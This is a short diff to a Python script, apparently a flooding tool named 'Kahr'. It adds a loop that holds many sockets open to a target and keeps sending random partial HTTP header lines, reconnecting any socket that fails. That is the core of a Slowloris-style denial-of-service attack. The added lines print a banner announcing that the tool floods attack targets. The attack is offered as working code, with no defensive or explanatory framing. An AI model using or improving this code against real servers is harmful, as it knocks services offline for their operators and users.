@@ -80,6 +80,17 @@ def main():
 
         for _ in range(socket_count - len(socket_list)):
             print(("\033[32m {}       Connecting...".format("\n")))
+    while True:
+        print(("\033[92m [÷] Kahr floods attack targets to {}".format(len(socket_list))))
+
+        for s in socket_list:
+            try:
+                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
+            except socket.error:
+                socket_list.remove(s)
+
+        for _ in range(socket_count - len(socket_list)):
+            print(("\033[32m {}       Connecting...".format("\n")))
             try:
                 s=init_socket(ip,port)
                 if s:
